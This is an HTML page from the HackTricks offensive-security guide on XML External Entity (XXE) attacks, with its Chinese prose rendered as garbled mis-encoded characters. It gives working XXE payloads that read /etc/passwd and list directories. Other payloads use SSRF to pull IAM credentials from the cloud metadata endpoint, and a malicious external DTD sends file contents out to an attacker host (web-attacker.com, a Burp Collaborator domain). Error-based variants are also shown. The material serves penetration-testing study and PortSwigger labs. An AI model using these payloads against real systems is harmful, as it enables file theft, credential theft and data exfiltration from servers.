<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>XXE - XEE - XML External Entity</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="xxe---xee---xml-external-entity"><a class="header" href="#xxe---xee---xml-external-entity">XXE - XEE - XML External Entity</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="xml-åŸºç¡€"><a class="header" href="#xml-åŸºç¡€">XML åŸºç¡€</a></h2>
<p>XML æ˜¯ä¸€ç§ç”¨äºæ•°æ®å­˜å‚¨å’Œä¼ è¾“çš„æ ‡è®°è¯­è¨€ï¼Œå…·æœ‰çµæ´»çš„ç»“æ„ï¼Œå…è®¸ä½¿ç”¨æè¿°æ€§å‘½åçš„æ ‡ç­¾ã€‚å®ƒä¸ HTML çš„ä¸åŒä¹‹å¤„åœ¨äºä¸å—é™äºä¸€ç»„é¢„å®šä¹‰æ ‡ç­¾ã€‚å°½ç®¡ XML åœ¨ AJAX æŠ€æœ¯ä¸­çš„åˆå§‹ä½œç”¨æ˜¾è‘—ï¼Œä½†éšç€ JSON çš„å…´èµ·ï¼Œå…¶é‡è¦æ€§å·²ä¸‹é™ã€‚</p>
<ul>
<li><strong>é€šè¿‡å®ä½“è¡¨ç¤ºæ•°æ®</strong>ï¼šXML ä¸­çš„å®ä½“ä½¿å¾—æ•°æ®çš„è¡¨ç¤ºæˆä¸ºå¯èƒ½ï¼ŒåŒ…æ‹¬ç‰¹æ®Šå­—ç¬¦å¦‚ <code>&amp;lt;</code> å’Œ <code>&amp;gt;</code>ï¼Œå®ƒä»¬åˆ†åˆ«å¯¹åº”äº <code>&lt;</code> å’Œ <code>&gt;</code>ï¼Œä»¥é¿å…ä¸ XML çš„æ ‡ç­¾ç³»ç»Ÿå‘ç”Ÿå†²çªã€‚</li>
<li><strong>å®šä¹‰ XML å…ƒç´ </strong>ï¼šXML å…è®¸å®šä¹‰å…ƒç´ ç±»å‹ï¼Œæ¦‚è¿°å…ƒç´ åº”å¦‚ä½•ç»“æ„åŒ–ä»¥åŠå¯ä»¥åŒ…å«å“ªäº›å†…å®¹ï¼Œä»ä»»ä½•ç±»å‹çš„å†…å®¹åˆ°ç‰¹å®šçš„å­å…ƒç´ ã€‚</li>
<li><strong>æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD)</strong>ï¼šDTD åœ¨ XML ä¸­å¯¹äºå®šä¹‰æ–‡æ¡£çš„ç»“æ„å’Œå¯ä»¥åŒ…å«çš„æ•°æ®ç±»å‹è‡³å…³é‡è¦ã€‚å®ƒä»¬å¯ä»¥æ˜¯å†…éƒ¨çš„ã€å¤–éƒ¨çš„æˆ–ä¸¤è€…çš„ç»„åˆï¼ŒæŒ‡å¯¼æ–‡æ¡£çš„æ ¼å¼å’ŒéªŒè¯æ–¹å¼ã€‚</li>
<li><strong>è‡ªå®šä¹‰å’Œå¤–éƒ¨å®ä½“</strong>ï¼šXML æ”¯æŒåœ¨ DTD ä¸­åˆ›å»ºè‡ªå®šä¹‰å®ä½“ï¼Œä»¥å®ç°çµæ´»çš„æ•°æ®è¡¨ç¤ºã€‚å¤–éƒ¨å®ä½“é€šè¿‡ URL å®šä¹‰ï¼Œå¸¦æ¥äº†å®‰å…¨éšæ‚£ï¼Œç‰¹åˆ«æ˜¯åœ¨ XML å¤–éƒ¨å®ä½“ (XXE) æ”»å‡»çš„èƒŒæ™¯ä¸‹ï¼Œè¿™äº›æ”»å‡»åˆ©ç”¨äº† XML è§£æå™¨å¤„ç†å¤–éƒ¨æ•°æ®æºçš„æ–¹å¼ï¼š<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity "value" &gt; ]&gt;</code></li>
<li><strong>ä½¿ç”¨å‚æ•°å®ä½“æ£€æµ‹ XXE</strong>ï¼šä¸ºäº†æ£€æµ‹ XXE æ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨å¸¸è§„æ–¹æ³•å› è§£æå™¨å®‰å…¨æªæ–½è€Œå¤±è´¥æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ XML å‚æ•°å®ä½“ã€‚è¿™äº›å®ä½“å…è®¸ä½¿ç”¨å¸¦å¤–æ£€æµ‹æŠ€æœ¯ï¼Œä¾‹å¦‚è§¦å‘ DNS æŸ¥æ‰¾æˆ–å‘å—æ§åŸŸå‘å‡º HTTP è¯·æ±‚ï¼Œä»¥ç¡®è®¤æ¼æ´ã€‚</li>
<li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "file:///etc/passwd" &gt; ]&gt;</code></li>
<li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "http://attacker.com" &gt; ]&gt;</code></li>
</ul>
<h2 id="ä¸»è¦æ”»å‡»"><a class="header" href="#ä¸»è¦æ”»å‡»">ä¸»è¦æ”»å‡»</a></h2>
<p><a href="https://portswigger.net/web-security/xxe"><strong>è¿™äº›æ”»å‡»å¤§å¤šæ˜¯åœ¨å‡ºè‰²çš„ Portswiggers XEE å®éªŒå®¤ä¸­æµ‹è¯•çš„ï¼šhttps://portswigger.net/web-security/xxe</strong></a></p>
<h3 id="æ–°å®ä½“æµ‹è¯•"><a class="header" href="#æ–°å®ä½“æµ‹è¯•">æ–°å®ä½“æµ‹è¯•</a></h3>
<p>åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæˆ‘å°†æµ‹è¯•ä¸€ä¸ªç®€å•çš„æ–° ENTITY å£°æ˜æ˜¯å¦æœ‰æ•ˆã€‚</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY toreplace "3"&gt; ]&gt;
&lt;stockCheck&gt;
&lt;productId&gt;&amp;toreplace;&lt;/productId&gt;
&lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(870).png" alt="" /></p>
<h3 id="è¯»å–æ–‡ä»¶"><a class="header" href="#è¯»å–æ–‡ä»¶">è¯»å–æ–‡ä»¶</a></h3>
<p>è®©æˆ‘ä»¬å°è¯•ä»¥ä¸åŒçš„æ–¹å¼è¯»å– <code>/etc/passwd</code>ã€‚å¯¹äº Windowsï¼Œä½ å¯ä»¥å°è¯•è¯»å–: <code>C:\windows\system32\drivers\etc\hosts</code></p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ³¨æ„ SYSTEM "<em>**file:///**etc/passwd</em>" ä¹Ÿä¼šæœ‰æ•ˆã€‚</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM "/etc/passwd"&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(86).png" alt="" /></p>
<p>è¿™ä¸ªç¬¬äºŒä¸ªæ¡ˆä¾‹åº”è¯¥æœ‰åŠ©äºæå–æ–‡ä»¶ï¼Œå¦‚æœwebæœåŠ¡å™¨ä½¿ç”¨PHPï¼ˆPortswiggerså®éªŒå®¤çš„æƒ…å†µé™¤å¤–ï¼‰</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>åœ¨è¿™ä¸ªç¬¬ä¸‰ä¸ªæ¡ˆä¾‹ä¸­ï¼Œè¯·æ³¨æ„æˆ‘ä»¬å°† <code>Element stockCheck</code> å£°æ˜ä¸º ANY</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT stockCheck ANY&gt;
&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;stockCheck&gt;
&lt;productId&gt;&amp;file;&lt;/productId&gt;
&lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck3&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(753).png" alt="" /></p>
<h3 id="ç›®å½•åˆ—è¡¨"><a class="header" href="#ç›®å½•åˆ—è¡¨">ç›®å½•åˆ—è¡¨</a></h3>
<p>åœ¨<strong>Java</strong>åŸºç¡€çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¯èƒ½é€šè¿‡XXEä½¿ç”¨ç±»ä¼¼çš„æœ‰æ•ˆè´Ÿè½½<strong>åˆ—å‡ºç›®å½•çš„å†…å®¹</strong>ï¼ˆåªè¯·æ±‚ç›®å½•è€Œä¸æ˜¯æ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="language-xml">&lt;!-- Root / --&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///"&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;

&lt;!-- /etc/ --&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM "file:///etc/" &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;
</code></pre>
<h3 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h3>
<p>XXE å¯ä»¥è¢«ç”¨æ¥æ»¥ç”¨äº‘ä¸­çš„ SSRF</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<h3 id="blind-ssrf"><a class="header" href="#blind-ssrf">Blind SSRF</a></h3>
<p>ä½¿ç”¨<strong>ä¹‹å‰æåˆ°çš„æŠ€æœ¯</strong>ï¼Œæ‚¨å¯ä»¥è®©æœåŠ¡å™¨è®¿é—®æ‚¨æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œä»¥æ˜¾ç¤ºå…¶å­˜åœ¨æ¼æ´ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œå¯èƒ½æ˜¯å› ä¸º<strong>ä¸å…è®¸ä½¿ç”¨XMLå®ä½“</strong>ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨<strong>XMLå‚æ•°å®ä½“</strong>ï¼š</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<h3 id="ç›²-ssrf---é€šè¿‡å¸¦å¤–æ–¹å¼æå–æ•°æ®"><a class="header" href="#ç›²-ssrf---é€šè¿‡å¸¦å¤–æ–¹å¼æå–æ•°æ®">"ç›²" SSRF - é€šè¿‡å¸¦å¤–æ–¹å¼æå–æ•°æ®</a></h3>
<p><strong>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªå¸¦æœ‰æ¶æ„è´Ÿè½½çš„æ–° DTDï¼Œè¯¥è´Ÿè½½å°†é€šè¿‡ HTTP è¯·æ±‚å‘é€æ–‡ä»¶çš„å†…å®¹ï¼ˆå¯¹äºå¤šè¡Œæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡ _ftp://</strong>_ æ¥æå–å®ƒï¼Œä¾‹å¦‚ä½¿ç”¨è¿™ä¸ªåŸºæœ¬æœåŠ¡å™¨ <a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb"><strong>xxe-ftp-server.rb</strong></a><strong>ï¼‰ã€‚è¿™ä¸ªè§£é‡ŠåŸºäº</strong> <a href="https://portswigger.net/web-security/xxe/blind"><strong>Portswiggers å®éªŒå®¤</strong></a><strong>ã€‚</strong></p>
<p>åœ¨ç»™å®šçš„æ¶æ„ DTD ä¸­ï¼Œæ‰§è¡Œäº†ä¸€ç³»åˆ—æ­¥éª¤ä»¥æå–æ•°æ®ï¼š</p>
<h3 id="æ¶æ„-dtd-ç¤ºä¾‹"><a class="header" href="#æ¶æ„-dtd-ç¤ºä¾‹">æ¶æ„ DTD ç¤ºä¾‹ï¼š</a></h3>
<p>ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;
</code></pre>
<p>The steps executed by this DTD include:</p>
<ol>
<li><strong>å‚æ•°å®ä½“çš„å®šä¹‰ï¼š</strong></li>
</ol>
<ul>
<li>åˆ›å»ºä¸€ä¸ª XML å‚æ•°å®ä½“ <code>%file</code>ï¼Œè¯»å– <code>/etc/hostname</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>å®šä¹‰å¦ä¸€ä¸ª XML å‚æ•°å®ä½“ <code>%eval</code>ã€‚å®ƒåŠ¨æ€å£°æ˜ä¸€ä¸ªæ–°çš„ XML å‚æ•°å®ä½“ <code>%exfiltrate</code>ã€‚<code>%exfiltrate</code> å®ä½“è¢«è®¾ç½®ä¸ºå‘æ”»å‡»è€…çš„æœåŠ¡å™¨å‘èµ· HTTP è¯·æ±‚ï¼Œå°† <code>%file</code> å®ä½“çš„å†…å®¹ä½œä¸º URL æŸ¥è¯¢å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ä¼ é€’ã€‚</li>
</ul>
<ol start="2">
<li><strong>å®ä½“çš„æ‰§è¡Œï¼š</strong></li>
</ol>
<ul>
<li>ä½¿ç”¨ <code>%eval</code> å®ä½“ï¼Œå¯¼è‡´åŠ¨æ€å£°æ˜ <code>%exfiltrate</code> å®ä½“çš„æ‰§è¡Œã€‚</li>
<li>ç„¶åä½¿ç”¨ <code>%exfiltrate</code> å®ä½“ï¼Œè§¦å‘å¯¹æŒ‡å®š URL çš„ HTTP è¯·æ±‚ï¼ŒåŒ…å«æ–‡ä»¶çš„å†…å®¹ã€‚</li>
</ul>
<p>æ”»å‡»è€…å°†è¿™ä¸ªæ¶æ„ DTD æ‰˜ç®¡åœ¨ä»–ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šï¼Œé€šå¸¸åœ¨ç±»ä¼¼ <code>http://web-attacker.com/malicious.dtd</code> çš„ URL ä¸‹ã€‚</p>
<p><strong>XXE Payload:</strong> To exploit a vulnerable application, the attacker sends an XXE payload:</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>è¿™ä¸ªæœ‰æ•ˆè´Ÿè½½å®šä¹‰äº†ä¸€ä¸ª XML å‚æ•°å®ä½“ <code>%xxe</code> å¹¶å°†å…¶çº³å…¥ DTDã€‚å½“è¢« XML è§£æå™¨å¤„ç†æ—¶ï¼Œè¿™ä¸ªæœ‰æ•ˆè´Ÿè½½ä»æ”»å‡»è€…çš„æœåŠ¡å™¨è·å–å¤–éƒ¨ DTDã€‚ç„¶åè§£æå™¨å†…è”è§£é‡Š DTDï¼Œæ‰§è¡Œæ¶æ„ DTD ä¸­æ¦‚è¿°çš„æ­¥éª¤ï¼Œå¯¼è‡´ <code>/etc/hostname</code> æ–‡ä»¶è¢«å¤–æ³„åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚</p>
<h3 id="åŸºäºé”™è¯¯å¤–éƒ¨-dtd"><a class="header" href="#åŸºäºé”™è¯¯å¤–éƒ¨-dtd">åŸºäºé”™è¯¯ï¼ˆå¤–éƒ¨ DTDï¼‰</a></h3>
<p><strong>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªæ¶æ„ DTDï¼Œè¯¥ DTD å°†åœ¨é”™è¯¯æ¶ˆæ¯ä¸­æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼ˆä»…åœ¨æ‚¨å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æ—¶æœ‰æ•ˆï¼‰ã€‚</strong> <a href="https://portswigger.net/web-security/xxe/blind"><strong>ç¤ºä¾‹æ¥è‡ªè¿™é‡Œã€‚</strong></a></p>
<p>å¯ä»¥é€šè¿‡ä½¿ç”¨æ¶æ„å¤–éƒ¨æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰è§¦å‘ä¸€ä¸ª XML è§£æé”™è¯¯æ¶ˆæ¯ï¼Œæ­ç¤º <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚è¿™æ˜¯é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®Œæˆçš„ï¼š</p>
<ol>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>file</code> çš„ XML å‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å« <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>eval</code> çš„ XML å‚æ•°å®ä½“ï¼ŒåŒ…å«å¯¹å¦ä¸€ä¸ª XML å‚æ•°å®ä½“ <code>error</code> çš„åŠ¨æ€å£°æ˜ã€‚å½“è¯„ä¼°æ—¶ï¼Œè¿™ä¸ª <code>error</code> å®ä½“å°è¯•åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå°† <code>file</code> å®ä½“çš„å†…å®¹ä½œä¸ºå…¶åç§°ã€‚</li>
<li>è°ƒç”¨ <code>eval</code> å®ä½“ï¼Œå¯¼è‡´ <code>error</code> å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚</li>
<li>è°ƒç”¨ <code>error</code> å®ä½“å¯¼è‡´å°è¯•åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œäº§ç”Ÿä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å« <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ä½œä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚</li>
</ol>
<p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ XML è°ƒç”¨æ¶æ„å¤–éƒ¨ DTDï¼š</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>åœ¨æ‰§è¡Œæ—¶ï¼Œweb æœåŠ¡å™¨çš„å“åº”åº”åŒ…å«ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œæ˜¾ç¤º <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><img src="../.gitbook/assets/image%20(809).png" alt="" /></p>
<p><em><strong>è¯·æ³¨æ„ï¼Œå¤–éƒ¨ DTD å…è®¸æˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªå®ä½“å†…éƒ¨åŒ…å«ä¸€ä¸ªå®ä½“ï¼ˆ<strong><strong><code>eval</code></strong></strong>ï¼‰ï¼Œä½†åœ¨å†…éƒ¨ DTD ä¸­æ˜¯ç¦æ­¢çš„ã€‚å› æ­¤ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•å¼ºåˆ¶äº§ç”Ÿé”™è¯¯è€Œä¸ä½¿ç”¨å¤–éƒ¨ DTDã€‚</strong></em></p>
<h3 id="åŸºäºé”™è¯¯ç³»ç»Ÿ-dtd"><a class="header" href="#åŸºäºé”™è¯¯ç³»ç»Ÿ-dtd"><strong>åŸºäºé”™è¯¯ï¼ˆç³»ç»Ÿ DTDï¼‰</strong></a></h3>
<p>é‚£ä¹ˆï¼Œå½“ <strong>å‡ºå¸¦å¤–äº¤äº’è¢«é˜»æ­¢</strong>ï¼ˆå¤–éƒ¨è¿æ¥ä¸å¯ç”¨ï¼‰æ—¶ï¼Œç›² XXE æ¼æ´æ€ä¹ˆåŠï¼Ÿ</p>
<p>XML è¯­è¨€è§„èŒƒä¸­çš„ä¸€ä¸ªæ¼æ´å¯ä»¥ <strong>é€šè¿‡é”™è¯¯æ¶ˆæ¯æš´éœ²æ•æ„Ÿæ•°æ®ï¼Œå½“æ–‡æ¡£çš„ DTD æ··åˆå†…éƒ¨å’Œå¤–éƒ¨å£°æ˜æ—¶</strong>ã€‚è¿™ä¸ªé—®é¢˜å…è®¸ä»å†…éƒ¨ DTD ä¸­é‡æ–°å®šä¹‰å¤–éƒ¨å£°æ˜çš„å®ä½“ï¼Œä»è€Œä¿ƒè¿›åŸºäºé”™è¯¯çš„ XXE æ”»å‡»çš„æ‰§è¡Œã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†ä¸€ä¸ª XML å‚æ•°å®ä½“çš„é‡æ–°å®šä¹‰ï¼Œè¯¥å®ä½“æœ€åˆåœ¨å¤–éƒ¨ DTD ä¸­å£°æ˜ï¼Œä»å†…éƒ¨ DTD ä¸­è¿›è¡Œé‡æ–°å®šä¹‰ã€‚å½“æœåŠ¡å™¨é˜»æ­¢å‡ºå¸¦å¤–è¿æ¥æ—¶ï¼Œæ”»å‡»è€…å¿…é¡»ä¾èµ–æœ¬åœ° DTD æ–‡ä»¶è¿›è¡Œæ”»å‡»ï¼Œæ—¨åœ¨è¯±å‘è§£æé”™è¯¯ä»¥æ­ç¤ºæ•æ„Ÿä¿¡æ¯ã€‚</p>
